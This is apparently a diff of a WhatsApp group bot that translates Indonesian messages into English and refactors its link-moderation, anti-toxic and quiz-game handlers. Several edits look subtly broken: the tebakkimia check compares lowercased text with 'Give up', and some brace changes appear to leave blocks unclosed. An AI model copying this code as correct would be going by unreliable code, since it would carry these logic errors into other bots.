+      if (!isBotAdmins) 
+        return replytolak(`⚠️ Insufficient permissions. Bot must be an admin to enforce link restrictions.`)
+
       if (isAdmins || Ahmad || fromMe) return;
 
-      // Hapus pesan link asing
+      // Delete foreign group link
       await hydro.sendMessage(m.chat, {
         delete: {
           remoteJid: m.chat,
@@ -3052,7 +3114,9 @@ if (Antilinkgc) {
       });
 
       const warningsFile = './database/antilinkgc-warning.json';
-      let warningDb = fs.existsSync(warningsFile) ? JSON.parse(fs.readFileSync(warningsFile)) : {};
+      let warningDb = fs.existsSync(warningsFile) 
+        ? JSON.parse(fs.readFileSync(warningsFile)) 
+        : {};
 
       if (!warningDb[m.chat]) warningDb[m.chat] = {};
       if (!warningDb[m.chat][m.sender]) warningDb[m.chat][m.sender] = 0;
@@ -3062,19 +3126,22 @@ if (Antilinkgc) {
 
       if (warnCount >= 3) {
         await hydro.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
+
         await hydro.sendMessage(m.chat, {
-          text: `🚫 *PELANGGARAN BERULANG!*\n\n@${m.sender.split("@")[0]} telah membagikan tautan grup *asing* sebanyak *3 kali*.\n\n📤 Telah dikeluarkan dari grup.`,
+          text: `⚔️ *Protocol Breach*\n\n@${m.sender.split("@")[0]} repeatedly shared unauthorized group links (*3 violations*).\n🚫 User removed from system.`,
           contextInfo: { mentionedJid: [m.sender] }
         });
 
-        warningDb[m.chat][m.sender] = 0; // Reset setelah kick
+        warningDb[m.chat][m.sender] = 0; // reset
       } else {
         fs.writeFileSync(warningsFile, JSON.stringify(warningDb, null, 2));
+
         await hydro.sendMessage(m.chat, {
-          text: `⚠️ *TAUTAN TERDETEKSI!*\n\n@${m.sender.split("@")[0]} membagikan tautan grup *asing*. Ini adalah peringatan ke *${warnCount}/3*.\n\n🚨 Jika mencapai 3 peringatan, kamu akan dikeluarkan!`,
+          text: `⚠️ *Warning Issued*\n\n@${m.sender.split("@")[0]} shared an external group link.\n📛 Warning Level: *${warnCount}/3*\n\nFurther violations will result in removal.`,
           contextInfo: { mentionedJid: [m.sender] }
         });
       }
+
     } catch (err) {
       console.error('AntilinkGC error:', err);
     }
@@ -3083,20 +3150,20 @@ if (Antilinkgc) {
 
 //Antichlink
 if (Antilinkch && budy.match(/whatsapp\.com\/channel/gi)) {
-    if (!isBotAdmins) return replytolak('🚫 *Bot harus menjadi admin untuk menindak pelanggaran link!*');
+    if (!isBotAdmins) return replytolak('🚫 *Bot must be an admin to take action on link violations!*');
 
     let senderId = m.sender;
 
     // Admin & Owner dibebaskan
     if (isAdmins) {
         return hydro.sendMessage(m.chat, {
-            text: `🛡️ *「 Channel Link Terdeteksi 」*\n\n👮 Admin mengirim link, admin diperbolehkan.`,
+            text: `🛡️ *「 Channel Link Detected 」*\n\n👮 Admin sent the link, admin is allowed.`,
         }, { quoted: m });
     }
 
     if (Ahmad) {
         return hydro.sendMessage(m.chat, {
-            text: `🛡️ *「 Channel Link Terdeteksi 」*\n\n👑 Owner mengirim link, owner diperbolehkan.`,
+            text: `🛡️ *「 Channel Link Detected 」*\n\n👑 Owner sent link, owner is allowed.`,
         }, { quoted: m });
     }
 
@@ -3110,102 +3177,90 @@ if (Antilinkch && budy.match(/whatsapp\.com\/channel/gi)) {
         }
     });
 
-    // Inisialisasi / Tambah warning
-    if (!warnlinkch[m.chat]) warnlinkch[m.chat] = {};
-    if (!warnlinkch[m.chat][senderId]) warnlinkch[m.chat][senderId] = 1;
-    else warnlinkch[m.chat][senderId] += 1;
+    // CHANNEL LINK WARNING SYSTEM
+if (!warnlinkch[m.chat]) warnlinkch[m.chat] = {};
+if (!warnlinkch[m.chat][senderId]) warnlinkch[m.chat][senderId] = 1;
+else warnlinkch[m.chat][senderId] += 1;
 
-    let warning = warnlinkch[m.chat][senderId];
+let warning = warnlinkch[m.chat][senderId];
+saveWarnLinkCh();
+
+if (warning >= 3) {
+    delete warnlinkch[m.chat][senderId];
     saveWarnLinkCh();
 
-    if (warning >= 3) {
-        delete warnlinkch[m.chat][senderId];
-        saveWarnLinkCh();
+    await hydro.groupParticipantsUpdate(m.chat, [senderId], 'remove');
 
-        await hydro.groupParticipantsUpdate(m.chat, [senderId], 'remove');
+    return hydro.sendMessage(m.chat, {
+        text: `⚔️ *Protocol Breach*\n\n@${senderId.split("@")[0]} repeatedly shared channel links (*3 violations*).\n🚫 User removed.`,
+        contextInfo: { mentionedJid: [senderId] }
+    }, { quoted: m });
 
-        return hydro.sendMessage(m.chat, {
-            text: `🚨 *「 Channel Link Terdeteksi 」*\n\n@${senderId.split("@")[0]} telah mengirim link channel *sebanyak 3 kali*.\n\n💣 *Aksi: Dikeluarkan dari grup!*`,
-            contextInfo: { mentionedJid: [senderId] }
-        }, { quoted: m });
-    } else {
-        return hydro.sendMessage(m.chat, {
-            text: `⚠️ *「 Peringatan Link Channel 」*\n\n@${senderId.split("@")[0]}, dilarang mengirim link channel WhatsApp!\n📛 Peringatan ke: *${warning}/3*\n🧹 Pesanmu telah dihapus.`,
-            contextInfo: { mentionedJid: [senderId] }
-        }, { quoted: m });
+} else {
+    return hydro.sendMessage(m.chat, {
+        text: `⚠️ *Warning Issued*\n\n@${senderId.split("@")[0]}, sharing WhatsApp channel links is prohibited.\n📛 Warning Level: *${warning}/3*\n🧹 Message removed.`,
+        contextInfo: { mentionedJid: [senderId] }
+    }, { quoted: m });
+}
+
+  // ANTI WA.ME ─────────────────────────
+if (antiWame && /wa\.me/i.test(budy)) {
+
+    if (!isBotAdmins) return;
+
+    // Allow admins & owner
+    if (isAdmins || Ahmad || m.key.fromMe) {
+        return reply(`⚔️ *System Notice*\n\nAuthorized user detected. No restriction applied.`);
     }
-}
 
-  if (antiWame)
-  if (budy.includes(`Wa.me`)) {
-if (!isBotAdmins) return
-bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
-if (isAdmins) return reply(bvl)
-if (!m.key.fromMe) return reply(bvl)
-if (Ahmad) return reply(bvl)
-kice = m.sender
-        await hydro.sendMessage(m.chat,
-			    {
-			        delete: {
-			            remoteJid: m.chat,
-			            fromMe: false,
-			            id: m.key.id,
-			            participant: m.key.participant
-			        }
-			    })
+    // Delete message
+    await hydro.sendMessage(m.chat, {
+        delete: {
+            remoteJid: m.chat,
+            fromMe: false,
+            id: m.key.id,
+            participant: m.key.participant
+        }
+    });
 
-			hydro.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
-} else {
+    // Send warning
+    return hydro.sendMessage(m.chat, {
+        text: `⚠️ *Link Removed*\n\n@${m.sender.split("@")[0]} shared a restricted wa.me link.\n🚫 Message deleted.`,
+        contextInfo: { mentionedJid: [m.sender] }
+    }, { quoted: m });
 }
-  if (antiWame)
-  if (budy.includes(`https://wa.me`)) {
-if (!isBotAdmins) return
-bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
-if (isAdmins) return reply(bvl)
-if (!m.key.fromMe) return reply(bvl)
-if (Ahmad) return reply(bvl)
-kice = m.sender
-        await hydro.sendMessage(m.chat,
-			    {
-			        delete: {
-			            remoteJid: m.chat,
-			            fromMe: false,
-			            id: m.key.id,
-			            participant: m.key.participant
-			        }
-			    })
-			
-hydro.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
-} else {
-}
+// ANTI TOXIC ─────────────────────────
 if (m.isGroup && nttoxic.includes(m.chat) && badwords.some(bw => body.toLowerCase().includes(bw))) {
     try {
-        if (isAdmins) return
-        if (Ahmad) return  
+        if (isAdmins || Ahmad) return;
 
-        await hydro.sendMessage(m.chat, { delete: m.key })
+        await hydro.sendMessage(m.chat, { delete: m.key });
 
-        if (!userWarnings[m.sender]) userWarnings[m.sender] = 0
-        userWarnings[m.sender] += 1
+        if (!userWarnings[m.sender]) userWarnings[m.sender] = 0;
+        userWarnings[m.sender]++;
 
-        let warningCount = userWarnings[m.sender]
-        let tagUser = `@${m.sender.split('@')[0]}`
+        let warningCount = userWarnings[m.sender];
+        let tagUser = `@${m.sender.split('@')[0]}`;
 
         if (warningCount >= 5) {
-            await hydro.groupParticipantsUpdate(m.chat, [m.sender], "remove")
+            await hydro.groupParticipantsUpdate(m.chat, [m.sender], "remove");
+
             await hydro.sendMessage(m.chat, {
-                text: `🚫 ${tagUser} sudah 5x toxic dan telah di-kick dari grup!`,
+                text: `⚔️ *Toxicity Threshold Exceeded*\n\n${tagUser} violated group rules (*5 offenses*).\n🚫 User removed.`,
                 mentions: [m.sender]
-            })
-            userWarnings[m.sender] = 0
+            });
+
+            userWarnings[m.sender] = 0;
+
         } else {
             await hydro.sendMessage(m.chat, {
-                text: `⚠️ ${tagUser}, jangan toxic!\nWarning: ${warningCount}/5`,
+                text: `⚠️ *Warning Issued*\n\n${tagUser}, inappropriate language detected.\n📛 Warning Level: *${warningCount}/5*`,
                 mentions: [m.sender]
-            })
+            });
         }
+
     } catch (e) {
-        console.log('Error AntiToxic:', e)
+        console.log('Error AntiToxic:', e);
     }
 }
 //antivirtex by xeon
@@ -3310,68 +3365,43 @@ if (Ahmad) return reply(bvl)
 hydro.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]}  because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
-//antilink telegram by xeon
-if (AntiLinkTelegram)
-   if (budy.includes("https://t.me/")){
-if (AntiLinkTelegram)
-if (!isBotAdmins) return
-bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin kirim link telegram, admin mah bebas kirim link apapun😇`
-if (isAdmins) return reply(bvl)
-if (!m.key.fromMe) return reply(bvl)
-if (Ahmad) return reply(bvl)
-        await hydro.sendMessage(m.chat,
-			    {
-			        delete: {
-			            remoteJid: m.chat,
-			            fromMe: false,
-			            id: m.key.id,
-			            participant: m.key.participant
-			        }
-			    })
-			
-hydro.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan telegram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
-} else {
-}
-if (AntiLinkTiktok)
-   if (budy.includes("https://www.tiktok.com/")){
-if (!isBotAdmins) return
-bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin kirim link tiktok, admin mah bebas kirim link apapun😇`
-if (isAdmins) return reply(bvl)
-if (!m.key.fromMe) return reply(bvl)
-if (Ahmad) return reply(bvl)
-        await hydro.sendMessage(m.chat,
-			    {
-			        delete: {
-			            remoteJid: m.chat,
-			            fromMe: false,
-			            id: m.key.id,
-			            participant: m.key.participant
-			        }
-			    })
-			
-hydro.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
-} else {
-}
-//antilink twitter by xeon
-if (AntiLinkTwitter)
-   if (budy.includes("https://twitter.com/")){
-if (!isBotAdmins) return
-bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin sudah kirim link twitter, admin mah bebas kirim link apapun😇`
-if (isAdmins) return reply(bvl)
-if (!m.key.fromMe) return reply(bvl)
-if (Ahmad) return reply(bvl)
-        await hydro.sendMessage(m.chat,
-			    {
-			        delete: {
-			            remoteJid: m.chat,
-			            fromMe: false,
-			            id: m.key.id,
-			            participant: m.key.participant
-			        }
-			    })
-			
-hydro.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
-} else {
+// ANTI SOCIAL LINKS ─────────────────────────
+if (isBotAdmins) {
+
+    const linkPatterns = [
+        { name: "Telegram", regex: /t\.me/i },
+        { name: "TikTok", regex: /tiktok\.com/i },
+        { name: "Twitter", regex: /twitter\.com|x\.com/i }
+    ];
+
+    const detected = linkPatterns.find(link => link.regex.test(budy));
+
+    if (detected) {
+
+        // Allow admin & owner
+        if (isAdmins || Ahmad || m.key.fromMe) {
+            return reply(`⚔️ *System Notice*\n\nAuthorized user shared a ${detected.name} link.`);
+        }
+
+        // Delete message
+        await hydro.sendMessage(m.chat, {
+            delete: {
+                remoteJid: m.chat,
+                fromMe: false,
+                id: m.key.id,
+                participant: m.key.participant
+            }
+        });
+
+        // Kick user (optional but matches your message)
+        await hydro.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
+
+        // Send report
+        return hydro.sendMessage(m.chat, {
+            text: `🚫 *Link Violation Detected*\n\n@${m.sender.split("@")[0]} shared a ${detected.name} link.\n💥 Action: Removed from group.`,
+            contextInfo: { mentionedJid: [m.sender] }
+        }, { quoted: m });
+    }
 }
 
 hydro.family100 = hydro.family100 ? hydro.family100 : {}
@@ -3417,17 +3447,22 @@ if (from in hydro.family100 && !m.key.fromMe) {
   const mentions = room.terjawab
     .filter(v => typeof v === 'string' && v.endsWith('@s.whatsapp.net'))
 
-  let caption =
-`╭┈┈⬡「 🎲 *FAMILY 100* 」
-┃ 🧩 Soal:
+  let caption = `
+╭━━━〔 🎲 *FAMILY 100* 〕━━━⬣
+┃ 🧩 *Question:*
 ┃ ${room.soal}
 ┃
-┃ ${isWin ? '🏁 Status: *SEMUA TERJAWAB ✅*' : isSurrender ? '🏳️ Status: *MENYERAH ❌*' : `🎁 Hadiah: *Rp ${Number(room.winScore || 0).toLocaleString('id-ID')}* / jawaban`}
-╰┈┈┈┈┈┈┈┈⬡
+┃ ${isWin 
+    ? '🏁 *Status:* All answers completed ✅' 
+    : isSurrender 
+    ? '🏳️ *Status:* Game surrendered ❌' 
+    : `🎁 *Reward:* Rp ${Number(room.winScore || 0).toLocaleString('id-ID')} per answer`}
+╰━━━━━━━━━━━━━━━━━━⬣
 
-╭┈┈⬡「 📋 *JAWABAN* 」
+╭━━━〔 📋 *ANSWERS* 〕━━━⬣
 ${answeredLines}
-╰┈┈┈┈┈┈┈┈⬡`.trim()
+╰━━━━━━━━━━━━━━━━━━⬣
+`.trim()
 
   hydro.sendMessage(m.chat, { text: caption, mentions }, { quoted: m }).then(msg => {
     hydro.family100[id].msg = msg
@@ -3440,9 +3475,17 @@ if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = tebaklagu[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
-   hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
+   hydro.sendMessage(m.chat, {
+      image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' },
+      caption: `🎮 *Guess The Song* 🎮
+
+✅ *Correct Answer!* 🎉
+
+🎧 Want to play again?
+Type *Guess Song* to continue.`
+   }, { quoted: m }) 
  delete tebaklagu[m.sender.split('@')[0]]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong answer!*')
 }
 //=============================================================
     hydro.tebaklogo = hydro.tebaklogo ? hydro.tebaklogo : {}
@@ -3453,19 +3496,27 @@ if (budy.toLowerCase() == jawaban) {
         // Jika jawaban benar
         if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
             users.exp += 5000 // Hadiah 5000 XP
-            reply(`✅ *Benar!*\n+5000 XP`)
+            reply(`⚔️ *Response Verified*
+
+✅ Correct.
+⚡ Reward: +5000 XP`)
             clearTimeout(hydro.tebaklogo[id][2]) // Hentikan timer
             delete hydro.tebaklogo[id] // Hapus sesi game
         } 
         // Jika pemain menyerah
         else if (/nyerah|surrender/i.test(m.text)) {
-            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
+            reply(`⚔️ *Game Terminated*
+
+💢 Player surrendered.
+
+📌 Answer:
+${json.jawaban}`)
             clearTimeout(hydro.tebaklogo[id][2]) // Hentikan timer
             delete hydro.tebaklogo[id] // Hapus sesi game
         } 
         // Jika jawaban salah
         else {
-            reply('❌ Jawaban salah!')
+            reply('❌ *Wrong Answer!*')
         }
         return
     }
@@ -3479,15 +3530,18 @@ hydro.tebaksurah = hydro.tebaksurah ? hydro.tebaksurah : {}
                 // Cek jawaban
                 if (budy.toLowerCase() === json.surah.englishName.toLowerCase().trim()) {
                     users.exp += 4999 // Hadiah 4999 XP
-                    reply(`✅ *Benar!*\n+4999 XP`, hydro.tebaksurah[id][0])
+                    reply(`✅ *Correct Answer!*\n⚡ +4999 XP`, hydro.tebaksurah[id][0])
                     clearTimeout(hydro.tebaksurah[id][2])
                     delete hydro.tebaksurah[id]
                 } else if (/nyerah|surrender/i.test(m.text)) { // Jika menyerah
-                    reply(`💢 Menyerah!\nSurah: *${json.surah.englishName}*`, hydro.tebaksurah[id][0])
+                    reply(`💢 *You Surrendered!*
+
+📖 Surah:
+*${json.surah.englishName}*`, hydro.tebaksurah[id][0])
                     clearTimeout(hydro.tebaksurah[id][2])
                     delete hydro.tebaksurah[id]
                 } else {
-                    reply('❌ Jawaban salah!')
+                    reply('❌ *Wrong Answer!*')
                 }
                 return
             }
@@ -3499,15 +3553,21 @@ hydro.tebaksurah = hydro.tebaksurah ? hydro.tebaksurah : {}
         let json = hydro.lengkapikalimat[id][1]
         if (budy.toLowerCase() === json.jawaban.toLowerCase().trim()) {
             users.exp += 5000 // Hadiah 5000 XP
-            reply(`✅ *Benar!*\n+5000 XP`)
+            reply(`⚔️ *Response Verified*
+
+✅ Correct.
+⚡ Reward: +5000 XP`)
             clearTimeout(hydro.lengkapikalimat[id][2])
             delete hydro.lengkapikalimat[id]
         } else if (/nyerah|surrender/i.test(m.text)) { // Jika menyerah
-            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
+            reply(`💢 *You Surrendered!*
+
+📌 Correct Answer:
+${json.jawaban}`)
             clearTimeout(hydro.lengkapikalimat[id][2])
             delete hydro.lengkapikalimat[id]
         } else {
-            reply('❌ Jawaban salah!')
+            reply('❌ *Wrong Answer!*')
         }
         return
     }
@@ -3520,19 +3580,22 @@ hydro.tebaksurah = hydro.tebaksurah ? hydro.tebaksurah : {}
         // Jika jawaban benar
         if (m.text.toLowerCase() === json.jawaban.toLowerCase().trim()) {
             users.exp += 4999 // Hadiah 4999 XP
-            reply(`✅ *Benar!*\n+4999 XP`)
+            reply(`✅ *Correct Answer!*\n⚡ +4999 XP`)
             clearTimeout(hydro.game[id][3]) // Hentikan timer
             delete hydro.game[id] // Hapus sesi game
         }
         // Jika pemain menyerah
         else if (/nyerah|surrender/i.test(m.text)) {
-            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
+            reply(`💢 *You Surrendered!*
+
+📌 Correct Answer:
+${json.jawaban}`)
             clearTimeout(hydro.game[id][3]) // Hentikan timer
             delete hydro.game[id] // Hapus sesi game
         }
         // Jika jawaban salah
         else {
-            reply('❌ Jawaban salah!')
+            reply('❌ Wrong Answer!')
         }
         return
     }
@@ -3544,19 +3607,22 @@ hydro.tebaksurah = hydro.tebaksurah ? hydro.tebaksurah : {}
     let users = global.db.users[m.sender]
         if (m.text.toLowerCase() === json.jawaban.toLowerCase().trim()) {
             users.exp += 4999 // Hadiah 4999 XP
-            reply(`✅ *Benar!*\n+4999 XP`)
+            reply(`✅ *Correct Answer!*\n⚡ +4999 XP`)
             clearTimeout(hydro.game[id][3]) // Hentikan timer
             delete hydro.game[id] // Hapus sesi game
         }
         // Jika pemain menyerah
         else if (/nyerah|surrender/i.test(m.text)) {
-            reply(`💢 Menyerah! Jawabannya: ${json.jawaban}`)
+            reply(`💢 *You Surrendered!*
+
+📌 Correct Answer:
+${json.jawaban}`)
             clearTimeout(hydro.game[id][3]) // Hentikan timer
             delete hydro.game[id] // Hapus sesi game
         }
         // Jika jawaban salah
         else {
-            reply('❌ Jawaban salah!')
+            reply('❌ *Wrong Answer!*')
         }
         return
     }
@@ -3569,11 +3635,15 @@ let json = JSON.parse(JSON.stringify(hydro.tebakkata[id][1]))
 kuis = true
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
  users.money += 10000
- var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
- replyhydro(`${teks}`)
+ var teks = `⚔️ *Guess The Word*
+
+✅ *Correct Answer!*
+
+💰 Reward: *10,000 Money*`
+replyhydro(teks)
  clearTimeout(hydro.tebakkata[id][2])
  delete hydro.tebakkata[id]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong Answer!*')
 }
 hydro.tebakgambar = hydro.tebakgambar ? hydro.tebakgambar : {} 
 if(from in hydro.tebakgambar) {
@@ -3583,60 +3653,74 @@ let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(hydro.tebakgambar[id][1]))
  if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
    users.money += 10000
- var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
- replyhydro(`${teks}`)
+ var teks = `⚔️ *Guess The Image*
+
+✅ *Correct Answer!*
+
+💰 Reward: *10,000 Money*
+
+🎮 Play again?
+Type *GuessImage*`
+replyhydro(teks)
  clearTimeout(hydro.tebakgambar[id][3])
  delete hydro.tebakgambar[id]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong Answer!*')
 }
 
 hydro.tebakbendera2 = hydro.tebakbendera2 ? hydro.tebakbendera2 : {};
 if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = tebakbendera2[m.sender.split('@')[0]]
-            if (budy.toLowerCase() == "nyerah") {
-await replyhydro('*Anda Telah menyerah*')
+            if (budy.toLowerCase() === "surrender") {
+    await replyhydro(`⚔️ *Game Terminated*
+
+💢 You surrendered.`)
 delete tebakbendera2[m.sender.split('@')[0]]
             } else if (budy.toLowerCase() == jawaban) {
-await hydro.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
+await hydro.sendText(m.chat, `⚔️ *Guess The Flag*
+
+✅ Correct Answer! 🎉`, m)
+
 delete tebakbendera2[m.sender.split('@')[0]]
-            } else console.log('*Jawaban Salah!*')
+
+} else {
+    await replyhydro('❌ *Incorrect Answer!*')
         }
 hydro.tebakbendera = hydro.tebakbendera ? hydro.tebakbendera : {};
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = tebakbendera[m.sender.split('@')[0]]
-            if (budy.toLowerCase() == "nyerah") {
-await replyhydro('*Anda Telah menyerah*')
+            if (budy.toLowerCase() == "give up") {
+await replyhydro('*you gave up*')
 delete tebakbendera[m.sender.split('@')[0]]
             } else if (budy.toLowerCase() == jawaban) {
-await hydro.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
+await hydro.sendText(m.chat, `🎮 Guess the Picture 🎮\n\nCorrect Answer 🎉`, m)
 delete tebakbendera[m.sender.split('@')[0]]
-            } else console.log('*Jawaban Salah!*')
+            } else console.log('*Wrong Answer!*')
         }
 hydro.tebakkabupaten = hydro.tebakkabupaten ? hydro.tebakkabupaten : {};
  if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = tebakkabupaten[m.sender.split('@')[0]]
-            if (budy.toLowerCase() == "nyerah") {
-await replyhydro('*Anda Telah menyerah*')
+            if (budy.toLowerCase() == "give up") {
+await replyhydro('*You have given up*')
 delete tebakkabupaten[m.sender.split('@')[0]]
             } else if (budy.toLowerCase() == jawaban) {
-await hydro.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
+await hydro.sendText(m.chat, `🎮 Guess the District 🎮\n\nCorrect Answer 🎉`, m)
 delete tebakkabupaten[m.sender.split('@')[0]]
-            } else console.log('*Jawaban Salah!*')
+            } else console.log('*Wrong Answer!*')
         }
  hydro.tebakkimia = hydro.tebakkimia ? hydro.tebakkimia : {};
         if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = tebakkimia[m.sender.split('@')[0]]
-            if (budy.toLowerCase() == "nyerah") {
-await replyhydro('*Anda Telah menyerah*')
+            if (budy.toLowerCase() == "Give up") {
+await replyhydro('*You gave up*')
 delete tebakkimia[m.sender.split('@')[0]]
             } else if (budy.toLowerCase() == jawaban) {
-await hydro.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
+await hydro.sendText(m.chat, `🎮 Chemistry guess🎮\n\nCorrect answer 🎉`, m)
 delete tebakkimia[m.sender.split('@')[0]]
-            } else console.log('*Jawaban Salah!*')
+            } else console.log('*Wrong answer!*')
         }
         
 //=========================================\\
@@ -3650,24 +3734,28 @@ let id = m.chat
 
  if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += hydro.tekateki[id][2]
- var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${hydro.tekateki[id][2]} Money 💸`
- replyhydro(`${teks}`)
+ var teks = `⚔️ *Riddle Game*
+
+✅ *Correct Answer!*
+
+💰 Reward: *+${hydro.tekateki[id][2]} Money* 💸`
+replyhydro(teks)
  clearTimeout(hydro.tekateki[id][3])
  delete hydro.tekateki[id]
- } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*Dikit Lagi!*`)
+ } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*A little more!*`)
 }
 //=========================================\\
 hydro.tebakasahotak = hydro.tebakasahotak ? hydro.tebakasahotak : {};
 if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = tebakasahotak[m.sender.split('@')[0]]
-            if (budy.toLowerCase() == "nyerah") {
-await replyhydro('*Anda Telah menyerah*')
+            if (budy.toLowerCase() == "give up") {
+await replyhydro('*You gave up*')
 delete tebakasahotak[m.sender.split('@')[0]]
             } else if (budy.toLowerCase() == jawaban) {
-await hydro.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
+await hydro.sendText(m.chat, `🎮 Brainstorm 🎮\n\nCorrect answer 🎉`, m)
 delete tebakasahotak[m.sender.split('@')[0]]
-            } else console.log('*Jawaban Salah!*')
+            } else console.log('*Wrong answer!*')
         }
 //=========================================\\
         hydro.siapaaku = hydro.siapaaku ? hydro.siapaaku : {}
@@ -3680,11 +3768,15 @@ let users = global.db.users[m.sender]
 
  if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += hydro.siapaaku[id][2]
-var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${hydro.siapaaku[id][2]} Money 💸`
-   replyhydro(`${teks}`)
+var teks = `⚔️ *Who Am I*
+
+✅ *Correct Answer!*
+
+💰 Reward: *+${hydro.siapaaku[id][2]} Money* 💸`
+replyhydro(teks)
  clearTimeout(hydro.siapaaku[id][3])
  delete hydro.siapaaku[id]
- } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*Dikit Lagi!*`)
+ } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*A little more!*`)
 // else reply(`*Salah!*`) 
 }
 //=========================================\\
@@ -3698,11 +3790,15 @@ let users = global.db.users[m.sender]
 
  if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += hydro.susunkata[id][2]
-   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${hydro.susunkata[id][2]} Money 💸`
-replyhydro(`${teks}`)
+   var teks = `⚔️ *Word Scramble*
+
+✅ *Correct Answer!*
+
+💰 Reward: *+${hydro.susunkata[id][2]} Money* 💸`
+replyhydro(teks)
  clearTimeout(hydro.susunkata[id][3])
  delete hydro.susunkata[id]
- } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*Dikit Lagi!*`)
+ } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyhydro(`*A little more!*`)
 // else reply(`*Salah!*`)
  
 }
@@ -3713,19 +3809,29 @@ kuis = true
 jawaban = caklontong[m.sender.split('@')[0]]
 deskripsi = caklontong_desk[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
- hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
+ hydro.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `⚔️ *Guess The Lontong*
+
+✅ *Correct Answer!*
+
+🎮 Play again?
+Type *GuessLontong*`}, {quoted:m}) 
  delete caklontong[m.sender.split('@')[0]]
 delete caklontong_desk[m.sender.split('@')[0]]
-} else console.log('*Jawaban Salah!*')
+} else console.log('*Wrong answer!*')
 }
